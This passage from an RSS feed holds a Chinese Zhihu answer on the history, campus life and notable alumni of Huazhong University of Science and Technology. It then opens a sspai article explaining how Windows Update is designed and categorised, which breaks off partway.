data-private-watermark-src=\"v2-7abc37222e6695a1c5dd3abe7f38c23f\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ddf35a68d55070c8694d84290ba53bbd_720w.webp?rss\" data-caption=\"△ // 东九教学楼建成时，曾是全亚洲最大的教学楼。西十二像一座迷宫，即使在华科读书四年，也还是会迷路。两栋楼一共3万多张课桌，占全校的85%。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-ddf35a68d55070c8694d84290ba53bbd\" data-watermark-src=\"v2-c68d7eee02c3061d9774a54bcd9a3728\" data-private-watermark-src=\"v2-cb9821dda0c24247087e26d86e147aef\"></p>\n<p><br></p>\n<p>南一楼门口的毛主席雕像已经54岁了</p>\n<p>它是全武汉最早的一座毛主席雕像</p>\n<p>由华科师生自己铸模浇筑完成</p>\n<p>如今，它成为关山大道IT男们</p>\n<p>深夜加班时眺望的地标</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5c4b86627daca803be04b978d34be308_720w.webp?rss\" data-caption=\"△ // 华科毛主席雕塑1967年建成，高度接近15米。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-5c4b86627daca803be04b978d34be308\" data-watermark-src=\"v2-0f41b753d889c806c3546a68fe63bb82\" data-private-watermark-src=\"v2-cb349acdbf657a639d6174f2e4bd26e3\"></p>\n<p><br></p>\n<p>华科最传奇的，也是被吐槽最狠的</p>\n<p>莫过于学生的男女比例</p>\n<p>传说“关山口男子职业技术学院”曾经男女比例7：1</p>\n<p>2012年，微信之父张小龙回母校讲座时回忆</p>\n<p>“当年全班42个男生，3个女生</p>\n<p>直到去年同学聚会，还有一个女生不认识我。”</p>\n<p><br></p>\n<p>官方统计数据显示</p>\n<p>2017级本科生男女比例已经变成了2：1</p>\n<p>尽管如此，还是远远超过绝大多数大学</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f1e9049a6f05c732660f884904d41f35_720w.webp?rss\" data-caption=\"△ // 也许是巧合，校园雕塑也符合男女比例2：1。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-f1e9049a6f05c732660f884904d41f35\" data-watermark-src=\"v2-5c94d66e6d9badda632b9ed7e1f6b84a\" data-private-watermark-src=\"v2-a8fa5b8c7f225a4136dbec18810f415c\"></p>\n<p><br></p>\n<p>华科男的青春因此而孤独</p>\n<p>于是，这群最早的“社恐人群”在华科校园里<br></p>\n<p>鼓捣出了可能是全中国最早的大型社交网络</p>\n<p>“白云黄鹤BBS” 1996年3月诞生</p>\n<p>那是第一代武汉网民的记忆</p>\n<p>当时，家庭电脑都罕见，互联网更是新鲜</p>\n<p>华科男已经开始灌水、跟帖，隔空撩妹了</p>\n<p><br></p>\n<p>吃好喝好，是华科的老传统</p>\n<p>全校三十多个食堂</p>\n<p>烧烤凉菜小龙虾，大盘鸡烤肉饭排骨藕汤</p>\n<p>华科大概是全武汉</p>\n<p>乃至全华中食堂数量最多的大学</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2231b1678a7d85dccf7bc87d02cb50fb_720w.webp?rss\" data-caption=\"△ // 1989年，华工就实行了营养配餐制度，每顿饭都荤素搭配六七种菜，图为当年粮票。印章落款为“膳食科”，专注膳食三十年。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"original\" data-original-src=\"v2-2231b1678a7d85dccf7bc87d02cb50fb\" data-watermark-src=\"v2-57c2fb627588e87ad427bac3b75a0c0d\" data-private-watermark-src=\"v2-6781c7cd5d4f118e72ec806626328c27\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3dc7cf2d0486fcdec54955c3bfc5703c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"original\" data-original-src=\"v2-3dc7cf2d0486fcdec54955c3bfc5703c\" data-watermark-src=\"v2-f170800524b73b54fd34610b4ebb735f\" data-private-watermark-src=\"v2-1844dfb82448451fc2af93c184a9edab\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4b12b02c63532086c376b00a40535a4e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4b12b02c63532086c376b00a40535a4e\" data-watermark-src=\"v2-44654b9d4a226f37ed3002253c33a426\" data-private-watermark-src=\"v2-e4bf8a224bb0382b12808bd9f506e80f\"></p>\n<p><br></p>\n<p><b><i>“ 刚18岁的华科，原来有百年历史 ”</i></b></p>\n<p><br></p>\n<p>聊了八卦，说到正经的</p>\n<p>尽管武大华科的CP之战已经持续半个世纪之久</p>\n<p>“华中科技大学” 这个称谓却特别年轻</p>\n<p>2000年5月</p>\n<p>华中理工大学、同济医科大学、武汉城市建设学院三所学校正式合并成为“华科”</p>\n<p><br></p>\n<p>但华科校园里已经生长了半个世纪的大树证明</p>\n<p>它的历史，可以追溯到很久以前</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c915ba412872c461bbb152068e829cca_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-c915ba412872c461bbb152068e829cca\" data-watermark-src=\"v2-67a7be4d509c79cd07b2262fc024b28d\" data-private-watermark-src=\"v2-1d46066f61c8a9fc5f3f1a9a1ba26e1d\"></p>\n<p><br></p>\n<p>同济是华科历史最悠久的分支</p>\n<p>1907年诞生在上海，由德国人埃里希·宝隆创办</p>\n<p>这位皇家海军医生，清末随军征战东亚沿海</p>\n<p>最终选择留在上海，办医学院</p>\n<p>培养了中国最早的一批西医人才</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e77ad30f5c398bf3d808e5d639d96c6_720w.webp?rss\" data-caption=\"△ // 埃里希·宝隆是一位孤儿，靠勤奋苦读拿到医学博士学位，创办同济医学院以后不久，就因为伤寒去世\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1e77ad30f5c398bf3d808e5d639d96c6\" data-watermark-src=\"v2-b9c5502cf5d20da9f90ccd17d54be4bf\" data-private-watermark-src=\"v2-57a4e6127b484133ab38c1145c06a675\"></p>\n<p><br></p>\n<p>赶上战争年代，他的学生也都是传奇</p>\n<p>比如著名的医学泰斗裘法祖</p>\n<p>二战时，他在德国一家医院当主任</p>\n<p>从纳粹枪口下救出许多集中营战俘</p>\n<p>战争结束后，他在德国结婚生子、买车买房</p>\n<p>生活安稳幸福</p>\n<p>却在新中国成立后，毅然带着全家回国</p>\n<p>他一生做器官移植手术的数量至今无人超越</p>\n<p>被誉为“中国外科之父”</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1b3cf9681aff5ef4d3dfe2db4878d254_720w.webp?rss\" data-caption=\"△ // 裘法祖与德国妻子裘罗懿和子女合影。裘老1956年搬到武汉，一家五口住在华科不到70㎡的红砖房里，直到2008年去世\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"438\" data-watermark=\"original\" data-original-src=\"v2-1b3cf9681aff5ef4d3dfe2db4878d254\" data-watermark-src=\"v2-25561f77486219b4304a1d0ac2e00a9f\" data-private-watermark-src=\"v2-6b94840de8fe20538081e0b72ae4caaf\"></p>\n<p><br></p>\n<p><br></p>\n<p>抗日战争，同济师生八年长征走遍南方中国</p>\n<p>后来它迁到武汉，与武汉大学医学院合并</p>\n<p>变成了同济医科大学</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-32a91e23c899dfc73da2715802347153_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"591\" data-rawheight=\"395\" data-watermark=\"original\" data-original-src=\"v2-32a91e23c899dfc73da2715802347153\" data-watermark-src=\"v2-40c4097df28a6daf90c65dae0bdb42a9\" data-private-watermark-src=\"v2-2ee478c570cab7722387bfd1590ba151\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b203fcade5e293bb0b0bbb34b78e5905_720w.webp?rss\" data-caption=\"△ // “同济长征”期间，师生们划船迁徙逃难，在农村祠堂搭起临时教室讲课。\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"405\" data-watermark=\"original\" data-original-src=\"v2-b203fcade5e293bb0b0bbb34b78e5905\" data-watermark-src=\"v2-9e4195028f931f0389e31ed6d73cef77\" data-private-watermark-src=\"v2-67c4b77e72ba267a4f0ca14b6d3e646c\"></p>\n<p><br></p>\n<p>言归正传</p>\n<p>除了历史最悠久的同济医大</p>\n<p><b>在武汉人心目中，华科的前身是华中理工大学</b></p>\n<p><br></p>\n<p>1952年，赶上学苏联搞建设的热血时代</p>\n<p>武钢、武重、武锅、武船在武汉纷纷建成</p>\n<p>武汉一瞬间变成了中国的工业重镇</p>\n<p>毛主席钦点，国家教育部决定</p>\n<p>在这儿建一所牛x的工学院</p>\n<p>华工就诞生了</p>\n<p><br></p>\n<p>它由5所老牌院校的机械系和电力系组成</p>\n<p>“华科男”木讷的硬汉气质，就从这时开始诞生</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ad2389c78bf6bdfd410b020fd6aa66f2_720w.webp?rss\" data-caption=\"△ // 华中工学院的组建来源，如图所示。1985年它改名“华中理工大学”。中正大学就是现在的南昌大学。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"564\" data-watermark=\"original\" data-original-src=\"v2-ad2389c78bf6bdfd410b020fd6aa66f2\" data-watermark-src=\"v2-bd351106c77c2fb6c45df5fb0f800c26\" data-private-watermark-src=\"v2-ffb21b3f6d211629dd11d308bd22f185\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-85c2666aff06bcff5da63982b93f4c6f_720w.webp?rss\" data-caption=\"△ // 1952年，华工第一任校长查谦在学校成立大会上讲话。查谦校长曾是武大物理系主任。\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"718\" data-watermark=\"original\" data-original-src=\"v2-85c2666aff06bcff5da63982b93f4c6f\" data-watermark-src=\"v2-e44c67ecf40eea06a9b0bd0b104740ab\" data-private-watermark-src=\"v2-a51b364c4c63e96e914b2645384f7edf\"></p>\n<p><br></p>\n<p>当时，华工独占东郊喻家山，面积4000多亩</p>\n<p><b>如今华科面积已经扩展到7000多亩</b></p>\n<p><b>和北大规模差不多，比武大校园大三分之一</b></p>\n<p>老武汉人，还会把“华科”叫做“华工”</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c9adfcc10d8587daf299eb71b30414ef_720w.webp?rss\" data-caption=\"△ // 从喻家山顶俯瞰华科校园，浩荡壮观\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"700\" data-watermark=\"original\" data-original-src=\"v2-c9adfcc10d8587daf299eb71b30414ef\" data-watermark-src=\"v2-eb268415c73b340003a182ac8feb44e5\" data-private-watermark-src=\"v2-c1066a1db3b08fe4caafd76400d0cf4f\"></p>\n<p><br></p>\n<i><b></b></i><p><img src=\"https://pic4.zhimg.com/v2-2862d54bbeb15189366c27480c7fb5a8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-2862d54bbeb15189366c27480c7fb5a8\" data-watermark-src=\"v2-12aa106dd9c68e744d8a8481f9aab1a0\" data-private-watermark-src=\"v2-9ca25168d57262423a7d91faeac994de\"></p>\n<p><br></p>\n<p><b><i>\" 理工男扎堆，华科却特别文艺 \"</i></b></p>\n<p><br></p>\n<p>从建校开始，华科就特别重视搞文艺</p>\n<p>每星期在电影场播放电影</p>\n<p>在学生食堂里举办舞会</p>\n<p>P.S. 虽然没多少女生参加，画风请自己脑补</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f2b9746f3e6de1ea66019a86223a9eac_720w.webp?rss\" data-caption=\"△ // 1956年电影场刚建成，每场放映都人山人海。\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"870\" data-watermark=\"original\" data-original-src=\"v2-f2b9746f3e6de1ea66019a86223a9eac\" data-watermark-src=\"v2-34951cb82d277ba9093a8e40f8af0916\" data-private-watermark-src=\"v2-be800288c26683ca556993409aa6df4f\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7a89967980f0e92a0f2f238917d83aa5_720w.webp?rss\" data-caption=\"△ // 当年的露天电影场现在已经变成了华科机械楼，但在大楼中间，学校仍然原址复建了电影场。\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"469\" data-watermark=\"original\" data-original-src=\"v2-7a89967980f0e92a0f2f238917d83aa5\" data-watermark-src=\"v2-7f050e4ec8b28946bc7393b2f2d411b7\" data-private-watermark-src=\"v2-f2bf7c1f4a0fb4365ff22c1dafa55055\"></p>\n<p><br></p>\n<p>当然，文艺的自然环境也特别重要</p>\n<p>武大靠东湖的碧波远山给颜值加分</p>\n<p>华科只有一座喻家山那就干脆</p>\n<p><b>全！部！种！满！大！树！</b></p>\n<p><br></p>\n<p>树多，是华科的校园特色</p>\n<p>曾经森林覆盖率达到100%</p>\n<p>相当于，走在学校任何地方都能被树荫遮住</p>\n<p>火炉一样热的武汉夏天</p>\n<p>华科校园比武汉市区要凉快2℃</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0c543be165fe4c648d0664967a2ca841_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"852\" data-rawheight=\"509\" data-watermark=\"original\" data-original-src=\"v2-0c543be165fe4c648d0664967a2ca841\" data-watermark-src=\"v2-5f67e3664272796be65adeba0d6ba4d5\" data-private-watermark-src=\"v2-78a76e89490b80257eaea14b580bc395\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c2c6d84a0ea1d734bcee98f009052b12_720w.webp?rss\" data-caption=\"△ // 1950年代的华科南一楼（上图）和老图书馆（下图）门前，树木还很稀疏。\" data-size=\"normal\" data-rawwidth=\"552\" data-rawheight=\"378\" data-watermark=\"original\" data-original-src=\"v2-c2c6d84a0ea1d734bcee98f009052b12\" data-watermark-src=\"v2-ebcea16f75011ac01cec6fc25502ecf1\" data-private-watermark-src=\"v2-1861a889e7875f3004f49cc00337c2ec\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a84af27874c0756cedf42edce05de968_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1030\" data-rawheight=\"693\" data-watermark=\"original\" data-original-src=\"v2-a84af27874c0756cedf42edce05de968\" data-watermark-src=\"v2-7c611cf672d3cfb63cf3ae22896252fd\" data-private-watermark-src=\"v2-0c0fdcf74b0adafff32158bb7700628e\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d28858a74a8aef6617053f61e268c35_720w.webp?rss\" data-caption=\"△ // 如今华科森林覆盖率72%，空中俯瞰全是绿树。\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"700\" data-watermark=\"original\" data-original-src=\"v2-0d28858a74a8aef6617053f61e268c35\" data-watermark-src=\"v2-8f52338bb5ad662bb5406e35ea47868f\" data-private-watermark-src=\"v2-17f65729f11fdc13d37034225216c579\"></p>\n<p><br></p>\n<p>从1950年代到1980年代</p>\n<p>朱九思校长倡导全体师生种树</p>\n<p>据说 “种树” 是必修课，不种树不能毕业</p>\n<p><b>学校每砍一棵树，都必须校长亲自签字</b></p>\n<p>也就是从那时沿袭下来的规矩</p>\n<p>如今华科校园里的许多大树，已经50多岁高龄</p>\n<p>因为飘絮而在武汉已经罕见踪迹的法国梧桐</p>\n<p>如今只在华科还能见到</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc479cbe072f9bad166acc6edd07fe5f_720w.webp?rss\" data-caption=\"△ // 朱九思校长。他主持华工三十多年，也和大树一样长寿，一直到2015年去世，享年100岁。\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"656\" data-watermark=\"original\" data-original-src=\"v2-dc479cbe072f9bad166acc6edd07fe5f\" data-watermark-src=\"v2-5cb89a4d6784297d8e66f92d3610414f\" data-private-watermark-src=\"v2-7efd154f042332fc8f1a3b86d137ed34\"></p>\n<p><br></p>\n<p>1994年开始</p>\n<p>华科在全国高校中首次办起了“人文讲座”</p>\n<p>邀请全国各个学术领域的大咖来讲课</p>\n<p>相当于现在的“TED”、“一席”，特别火爆</p>\n<p>至今已经举办了2200多期</p>\n<p>在最火爆的时候，得提前三个小时以上占座</p>\n<p>否则连走廊台阶都挤不进去</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-780e90e83bb94d43eac0cfab6a618b02_720w.webp?rss\" data-caption=\"△ // 1995年“人文讲座”现场，倡导人文情怀的杨叔子校长被同学们热情围住。\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"504\" data-watermark=\"original\" data-original-src=\"v2-780e90e83bb94d43eac0cfab6a618b02\" data-watermark-src=\"v2-aeda47892c4139c416b627da3f4e8be4\" data-private-watermark-src=\"v2-6cd3f495a245864a4289742e27f9982c\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6d02da9800a898c1b5d34ccec2c0be5e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"700\" data-watermark=\"original\" data-original-src=\"v2-6d02da9800a898c1b5d34ccec2c0be5e\" data-watermark-src=\"v2-e93869a2bd709df0f44aa693c34d89d0\" data-private-watermark-src=\"v2-7ccf210f301c82d1f8505c4d13295ad4\"></p>\n<p><br></p>\n<p><b><i>\" 木讷闷骚的华科男</i></b></p>\n<p><b><i>是中国互联网创业圈的传奇 \"</i></b></p>\n<p><br></p>\n<p>归根到底</p>\n<p>华科最强大的标签莫过于“华科男”</p>\n<p>他们孤独闷骚</p>\n<p>像美剧《硅谷》《生活大爆炸》里的极客怪咖</p>\n<p>用直男癌的情商和爱因斯坦般的智商</p>\n<p>打开互联网世界的一百种可能性</p>\n<p>一夜之间，“华科系”成了中国创投圈的大热门</p>\n<p><br></p>\n<p>华科男的标配服装是</p>\n<p>格子衬衣、牛仔裤、塑料拖鞋或帆布鞋</p>\n<p>双肩包，左雨伞，右水杯</p>\n<p>坊间有个玩笑，说华科男大学四年里</p>\n<p>和异性说的最多的一句话是</p>\n<p>“阿姨，三两米饭，带走”</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6bbd535a080142d453ff5a89f874715d_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-6bbd535a080142d453ff5a89f874715d\" data-watermark-src=\"v2-0e42fbcf8f73e772724dd5fbb07e9e2f\" data-private-watermark-src=\"v2-f0726227d6ba4fc24e4f105d4cef0e3c\"></p>\n<p><br></p>\n<p>华科男的孤独与闷骚</p>\n<p>成了他们绞尽脑汁创新的原始动力</p>\n<p>却一不小心，玩出了许多中国创业圈里的传奇</p>\n<p><br></p>\n<p>比如，曾有一大帮男生为了看球深夜翻院墙</p>\n<p>掀垮了一扇校门</p>\n<p>其中一个哥们儿想着</p>\n<p>干脆做一款能直播看球的软件吧</p>\n<p>2004年，休学的姚欣在韵苑26栋寝室写出了PPLive1.0 版本软件</p>\n<p>发布在校内白云黄鹤BBS 上</p>\n<p>一年之内，PPTV的用户超过了2亿</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-40585298f7116692c05c644a0c1c9fea_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-40585298f7116692c05c644a0c1c9fea\" data-watermark-src=\"v2-a46b2816b2d3cc6ec07d5beff195c08e\" data-private-watermark-src=\"v2-1a8e30a6c25f5c31d9028f95176d80b9\"></p>\n<p><br></p>\n<p>又比如</p>\n<p>华科姑娘们总在论坛上吐槽</p>\n<p>男朋友送的最多的礼物是实验室手工做的锤子</p>\n<p>恋爱谈得越久，收集的锤子种类就会越多</p>\n<p>恋爱情商几乎为零的华科男，往往被分手</p>\n<p>所以，刚分手的付小龙意识到</p>\n<p>得做一款帮助大家谈恋爱的软件</p>\n<p>于是“恋爱笔记APP”很快拿到了1000万融资</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9ab5218456f177dd04b7aa029afbf361_720w.webp?rss\" data-caption=\"△ // 微信的开机界面，很好地解释了华科男“孤独又闷骚”的标签。张小龙曾说过，读书期间极不平衡的男女比例，是自己做社交产品的动力。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-9ab5218456f177dd04b7aa029afbf361\" data-watermark-src=\"v2-dfaf85ee5ddf958faf1c258939d5b8fb\" data-private-watermark-src=\"v2-3cd853513295249f293610fe2a1c4e63\"></p>\n<p><br></p>\n<p>除了微信、脸萌、Faceu、罗辑思维之类</p>\n<p>大家熟悉的东西诞生在华科男手里</p>\n<p>在中国的物理、航天、军事、医疗领域</p>\n<p>也有很多厉害的华科男</p>\n<p><br></p>\n<p>比如，去年第一艘国产航母下水</p>\n<p>它的副总设计师王硕威，是华科毕业的80后</p>\n<p>他是中国最年轻的航母设计师</p>\n<p>25岁就参与了辽宁号改装</p>\n<p><br></p>\n<p>华科被誉为中国创业圈的“黄埔军校”</p>\n<p><b>在遍布互联网创业公司的深圳</b></p>\n<p><b>华科被IT男们尊称为“小清华”</b></p>\n<p>曾经有一段时间，华为30%的员工都来自华科</p>\n<p>去年，雷军专程来武汉给小米招揽人才</p>\n<p>第一站就直奔华科，而不是母校武大</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-af25d908be110c6a2da9fb9ece86b243_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"699\" data-watermark=\"original\" data-original-src=\"v2-af25d908be110c6a2da9fb9ece86b243\" data-watermark-src=\"v2-a051b1ef4e913bb4e84922a47bb2e89e\" data-private-watermark-src=\"v2-aa71e10d68ca3954faa5b7a88cfa1d3d\"></p>\n<p><br></p>\n<p>从最古老的同济医学院开始算起</p>\n<p>华科的历史已经跨越百年</p>\n<p>从重组改名“华中科技大学”开始算起</p>\n<p>华科才刚刚21岁，正青春年少</p>\n<p><br></p>\n<p>这座相当于14座中山公园的庞大理工帝国</p>\n<p>在武汉东南郊低调蛰伏</p>\n<p>却凭着一代代 “华科男” 的脑力奋斗</p>\n<p>在中国互联网、科研领域独占一片天地</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6a00d245ec2abdf3c76f1907ed9b94cc_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"699\" data-watermark=\"original\" data-original-src=\"v2-6a00d245ec2abdf3c76f1907ed9b94cc\" data-watermark-src=\"v2-3b9f6fe8526911bda6cc813a45cc5b61\" data-private-watermark-src=\"v2-9cfcd4f9da4a1e40cc72819fd924ae28\"></p>\n<p><br></p>\n<p>69年缓慢沉淀</p>\n<p>让喻家山大树参天</p>\n<p>也让华中科技大学变得枝繁叶茂</p>\n<p>“华科男” 成了一个标签</p>\n<p>贴在中国互联网创业浪潮的历史上</p>\n<p>在像硅谷一样不断诞生奇迹的光谷</p>\n<p>今天的华科也在继续上演着</p>\n<p>属于HUST的奇迹</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485222477/answer/2109136436?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">111 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/432157399?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你所在的城市哪个景点是专供游客？本地人不去的？</a><br><a href=\"http://www.zhihu.com/question/321535568?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">哪个城市抬头就是风景，低头就是人生？</a><br>\n","link":"http://www.zhihu.com/question/485222477/answer/2109136436?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"和 Windows 更新打了这么多交道，这些事你可能还不知道","date":"2021-09-24 08:00:00","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>本文将介绍 Windows 10 及以上版本的系统更新功能，涵盖 Windows 更新的设计、四种更新的类型、执行更新的步骤、可能出现的部分错误及相应的解决方法。</p>\n<p>文章旨在帮助读者全面认识 Windows 更新这一和系统安全关系密切的功能，面向 Windows 家庭版、专业版的个人 PC 用户，特殊硬件及局域网中的 Windows 不在本文讨论范围内。由于内测通道分发更新的目的是帮助微软发现漏洞，其频率、内容和正常通道有很大的不同，因此本文也不会涉及。</p>\n<h2>Windows 更新的设计</h2>\n<p>从 Windows 10 开始，位于设置面板中的 Windows 更新成为了集 Windows 系统本体、微软应用和硬件驱动分发补丁和新功能的统一途径。Windows 作为操作系统级别软件，既要及时推送安全补丁和新功能以保障系统的安全可靠，也要将更新流程对用户的影响最小化。</p>\n<p>为了及时推送更新，Windows 被设定为自动下载安装大部分更新。用户可以延迟但不能用正常手段关闭这一策略。这些更新要么非常紧急，用于修补不久前被公布的安全漏洞，要么已经经过三重公开内测，没有大的稳定性问题。</p>\n<p>而为了减少对日常使用的影响，Windows 更新有三种设计：模块化、累积式和分类管理。</p>\n<p>操作系统决不能像小型应用那样安装更新必须下载完整的安装包再重启，Windows 因而采用了模块化的更新方案。从 Windows 10 开始，PC，Xbox、HoloLens 等设备上的各种 Windows 共享内核、部分 API 和驱动，微软称之为 OneCore。OneCore 可单独进行维护。此外，系统中随处可见的 DLL 文件也有助于模块化的实现。不同的 DLL 有其不同的职责，它们可供系统或第三方应用调用，实现某些效果。例如，<code>kernel32.dll</code>提供了 Windows 子系统相关功能。这些设计让微软想要更新 Windows 内核，或更新系统中对话框，只需要提供一部分文件即可。如果这部分文件暂时没有应用调用，那么用户不需要重启即可安装更新。</p>\n<p>在用户可感知的层面，微软还期望借助一些独立的包和 Microsoft Store 更新某些应用。打开设置面板中的系统信息界面，读者可能会发现在<code>Windows 规格 &gt; 体验</code>一栏中有 Windows Feature Experience Pack 的版本信息，它包含一些独立的应用，如画图，微软可单独推送它的更新。同样的，系统的一些预装应用，如语言包，还能在 Microsoft Store 中进行更新。这些设计都有助于模块化管理和维护，优化用户的下载安装体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmilb34taj5bdodi0.png\"></figure><p>累积式更新的设计是为了解决如下问题：在 4 - 9 月有六个 Windows 更新，那么如果用户在 9 月安装了 Windows，岂不是要将六个更新逐一安装？实际情况则是用户只需要安装最后一个月的更新——因为 Windows 本体的更新是累积式的，我们能在更新历史记录中看到许多条目后面的「累积更新」或「Cumulative Update」字样，这些更新会包括上一次更新的全部内容。</p>\n<p>举例来说，Windows 21H1 版本于 7 月 6 日获得的更新涉及了 52,750 个文件，而五天之后的更新则涉及了 53,196 个文件，从数量上不难发现，后一次更新建立在前一次的基础之上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmitb34tajfh55vsg.png\"></figure><p>累积更新会导致另一个问题：对于及时安装了以往更新的用户而言，难道每一次都要下载所有更新的内容吗？当然不是这样，Windows 在下载更新时，会尝试使用增量安装的方式，仅下载上次更新以来更改的项目，这些项目被称为更新的快速版本（Express version）。当无法使用增量安装的方式时，Windows 才会下载全量更新版本（Full-file version）。</p>\n<p>除了模块化和累积式的更新设计，将更新分门别类也是必要的。用于修复漏洞的安全更新需要立即推送，优先安装；一些微小的 UI 改动、不影响系统稳定性的 Bug 修复则适合在固定的时间统一推送；而对于系统重大更新和驱动的预览版本，还可以采用可选更新的方式，给用户时间选择的自由，等到时机成熟再以自动更新的方式推送给所有用户。Windows 更新的分类会在下一节中详细解释。</p>\n<h2>更新的四种主要类型</h2>\n<p>在设置面板的更新历史记录界面中，微软将更新分类为四种：定义更新、驱动程序更新、质量更新和功能更新。在这四种之外，还有一些更新被放在了其他类别中，恶意软件删除程序和前文提到的 Windows Feature Experience Pack 都在此之列，这些更新大多不涉及系统的关键功能，因此不做过多介绍。</p>\n<p>下面从最简单的定义更新开始讲起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmj5b34taja4rofjg.png\"></figure><h3>定义更新和 KB 